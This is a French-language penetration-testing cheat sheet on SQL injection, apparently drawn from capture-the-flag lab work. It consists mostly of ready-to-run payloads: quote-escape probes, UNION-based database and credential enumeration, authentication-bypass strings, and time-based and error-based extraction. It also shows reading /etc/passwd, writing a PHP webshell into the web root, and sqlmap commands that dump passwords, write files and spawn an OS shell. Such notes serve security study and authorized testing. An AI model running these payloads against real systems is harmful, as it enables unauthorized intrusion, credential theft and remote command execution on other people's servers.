
- [[#Types d'injection SQL possible]]

- [[#Identifier SQLi]]
	- [[#Méthodes d'échappement possibles UnionBased]]
	- [[#Observer une réponse différente BlindBased]]
	- [[#Commentaires possibles]]

- [[#Exploitation]]
	- [[#UNION Based]]
	- [[#BLIND Based]]
		- [[#Boolean Based]]
		- [[#Time based]]
	- [[#ERROR Based]]

- [[#SQLMAP]]

---
# Types d'injections #SQL possible

- IN BAND (Output lisible en front end) #UnionBased #ErrorBased
- BLIND (Pas d'output en front end) #BooleanBased #TimeBased




---
# Identifier SQLi

#### Méthodes d'échappement possibles #UnionBased 

Si erreur alors méthode d'échappement identifiée :

```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

One liner rapide, une fois l'erreur obtenue affiner.

```
'))"))`))
```


#### Observer une réponse différente #BlindBased

Injecter une valeur null ou aléatoire dans les cookies par exemple et voir si la réponse est différente.



#### Commentaires possibles

```
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```




---
# EXPLOITATION

- [[#Modify password of existing object/user]]
- [[#SQL Truncation attack]]

- [[#UNION Based]]
- [[#BLIND Based]]
- [[#ERROR Based]]

## Modify password of existing object/user

tester de créer AdMIn ou admin=

## SQL Truncation attack

Si limite de caractères pour la chaine de caractère user ou email -> créer admin [a lot of spaces] a



## UNION Based

Prérequis :
- Identifier le nb de colonnes.
- Identifier si une colonne peut retourner un string.

1. [[#Identifier le nombre de colonnes]]
2. [[#Identifier les colonnes pouvant retourner un string]]
3. [[#Enumération de la DB UnionBased]]
4. [[#Vérification des privilèges]]
5. [[#Injection de fichiers (si privilèges suffisants)]]

### Identifier le nombre de colonnes

Si erreur `The used SELECT statements have a different number of columns` -> https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MySQL-Bypass-Error/README.md

#### ORDER BY / GROUP BY

Incrémenter jusqu'à erreur :

```sql
cn' GROUP BY 1 #
```

```sql
1 GROUP BY 1 --
```

```sql
1' GROUP BY 1 --
```

```sql
cn' ORDER BY 1 #
```

```sql
' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -
```

#### UNION SELECT

Incrémenter jusqu'à ce que ça soit correct :

```sql
cn' UNION SELECT null #
cn' UNION SELECT null,null #
cn' UNION SELECT null,null,null #
```


### Identifier les colonnes pouvant retourner un string

Si erreur `Conversion failed when converting the varchar value 'a' to data type int.` -> la colonne ne peut pas retourner de string

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```



### Enumération de la DB #UnionBased

- [[#Concaténer colonnes]]
- [[#Identifier la version de la DB SQL]]
- [[#Récupérer le nom de la DB actuelle]]
- [[#Lister toutes les DB]]
- [[#Lister toutes les tables d'une DB]]
- [[#Lister toutes les colonnes d'une table]]
- [[#Dump les données d'une autre DB]]

#### Concaténer colonnes

Possible de concaténer plusieurs colonnes:

| Version    | operateur de concatenation | exemple                                                                       |
| ---------- | -------------------------- | ----------------------------------------------------------------------------- |
| Oracle     | \|\|                       | username \|\| ~ \|\| password                                                 |
| Microsoft  | +                          | foo + ~ + bar                                                                 |
| PostgreSQL | \|\|                       | foo \|\| ~ \|\| bar                                                           |
| MySQL      | space / concat(,)          | `foo bar` [Note the space between the two strings]  <br>`CONCAT('foo','bar')` |

#### Identifier la version de la DB #SQL  

```sql
cn' UNION SELECT 1, @@version, 3, 4 #MYSQL / MSSQL / MARIADB
```

```sql
cn' UNION SELECT * FROM v$version #ORACLE
```

```sql
cn' UNION SELECT 1, version(), 3, 4 #POSTGRESQL
```

```sql
cn' UNION SELECT 1, sqlite_version(), 3, 4 --SQLITE
```

### #TimeBased

```sql
cn' UNION SELECT 1, SLEEP(5), 3, 4 #
```

#### Récupérer le nom de la DB actuelle

```sql
cn' UNION select 1,database(),3,4 #
```

#### Lister toutes les DB

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA #
```

#### Lister toutes les tables d'une DB

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev' #
```

#### Lister toutes les colonnes d'une table

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials' #
```

#### Dump les données d'une autre DB

```sql
cn' UNION select 1, username, password, 4 from dev.credentials #
```


### Vérification des privilèges

#### Identifier le user actuel #UnionBased 

```sql
cn' UNION SELECT 1, user(), 3, 4 #
```

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user #
```

#### Vérifier si le user a des droits d'admin

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root" #
```

#### Trouver les privilèges du user sur le schéma

```sql
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'" #
```

#### Trouver les répertoires accessibles depuis l'application

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv" #
```



### Injection de fichiers (si privilèges suffisants)

#### Lire un fichier local #UnionBased (FILE privilege)

```sql
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4 #
```

#### Ecrire dans un fichier local (FILE privilege, secure_file_priv empty et droits d'écriture sur le répertoire cible )

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'
```

#### Upload un #Webshell  #UnionBased 

```sql
cn' union select '', '<?php system($_REQUEST[cmd]); ?>', '', '' into outfile '/var/www/html/shell.php' #
```



## BLIND Based

### Boolean Based

> [!Warning]
> Dangereux si le statement utilisé derrière est un UPDATE ou DELETE -> Perte de données.
> A tester sur les pages de login pour bypasser l'authent ou les fonctions de recherche uniquement.

Tester like au lieu de = également.

```sql
' OR 1=1 #
```

```sql
') OR 1=1 #
```

```sql
1 OR 1=1 #
```

```sql
1) OR 1=1 #
```

```sql
admin' --
```

```sql
admin' OR 1=2 --
```

```sql
user' OR '1'='1 #
```

```sql
user') OR '1'='1 #
```



### Time based

```sql
xyz' OR ID=1-SLEEP(10) #
```

#### Déclencher des réponses conditionnelles

Permet d'identifier les caractères 1 par 1 en fonction de la réponse

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm -- Caractère superieur à m ?
```



## ERROR Based

### Déclencher des erreurs conditionnelles

|   |   |
|---|---|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`|
|Microsoft|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`|
|PostgreSQL|`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|



---
# #SQLMAP


- [[#Bypass des protections Web]]
- [[#Enumération de la DB]]
- [[#Extraire les mots de passe des users de la DB]]
- [[#Interaction avec l'OS]]


> [!tip]
>Copier la requête à tester au format CURL ou copier requete depuis BURP / ZAP.
> Si paramètre vulnérable contenu au format json encodé en base64, décoder manuellement, mettre une etoile dans le paramètre a tester et réencoder. Puis tester en précisant l'option --base64=<PARAM>

```
sqlmap -r requestfile
```


## Bypass des protections Web

- [[#Anti-CSRF Token]]
- 

#### Anti-CSRF Token

Si le token csrf n'est pas contenue dans la requête de base, il est possible d'utiliser l'option --csrf-token pour spécifier le nom du paramètre. Le paramètre sera mis a jour avec la bonne valeur à chaque requete.

```shell
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```



## Enumération de la DB

### Identifier la version, de l'utilisateur actuel et s'il est dba, ainsi que la base de donnée actuelle

```
sqlmap <curl_request> --batch --banner --current-user --current-db --is-dba --threads 4 --level 5 --risk 3
```

### Rechercher les tables contenant le mot 'user'

```
sqlmap <curl_request> --batch --search -T user --threads 4 --level 5 --risk 3
```

### Rechercher les colonnes contenant le mot 'password'

```
sqlmap <curl_request> --batch --search -C password --threads 4 --level 5 --risk 3
```

### Identifier les bases de données

```
sqlmap <curl_request> --batch --dbs --threads 4 --level 5 --risk 3
```

### Identifier les tables d'une base de données:

```
sqlmap <curl_request> --batch -D monitorsthree --tables --threads 4 --level 5 --risk 3
```

### Identifier les colonnes d'une table

```
sqlmap <curl_request> --batch -D monitorsthree -T users --columns --threads 4 --level 5 --risk 3
```

### Dump les données des colonnes souhaitées

```
sqlmap <curl_request> --batch -D monitorsthree -T users -C username,password --dump --threads 4 --level 5 --risk 3
```




## Extraire les mots de passe des users de la DB

```
sqlmap <curl_request> --threads 4 --level 5 --risk 3 --passwords
```




## Interaction avec l'OS

### Verifier Privileges

```
sqlmap -r vote.cobblestone.htb/vote_suggest.req --batch --threads 5 --no-cast --privileges
```

### Lire un fichier

```
sqlmap <curl_request> --batch --file-read "/etc/passwd"
```

### Ecrire un fichier

```
sqlmap <curl_request> --batch --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

### Spawn un #shell

```
sqlmap <curl_request> --batch --os-shell
```
